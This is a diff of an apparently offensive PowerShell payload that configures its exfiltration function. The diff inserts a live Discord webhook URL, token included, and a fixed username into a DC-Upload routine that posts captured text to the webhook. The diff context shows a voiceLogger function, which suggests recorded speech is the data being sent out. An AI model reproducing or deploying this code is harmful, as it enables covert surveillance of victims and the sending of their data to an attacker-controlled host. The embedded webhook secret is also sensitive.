@@ -6,16 +6,15 @@ function DC-Upload {
 		[string]$text 
 	)
 
-	# $dc = 'YOUR DISCORD WEBHOOK GOES HERE IF YOU HOST YOUR OWN VERSION OF THIS PAYLOAD'
+	$dc = 'https://discord.com/api/webhooks/1335316397697404958/Jn3d-ijomnlKdGpLUpmhcNy54PXSpwYanXfkfgObS0pioMocS1gfPBqsKmh6dat8gJ_c'
 
 	$Body = @{
-	  'username' = $env:username
+	  'username' = 'ecorii'
 	  'content' = $text
 	}
 
 	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
 }
-
 
 
 function voiceLogger {
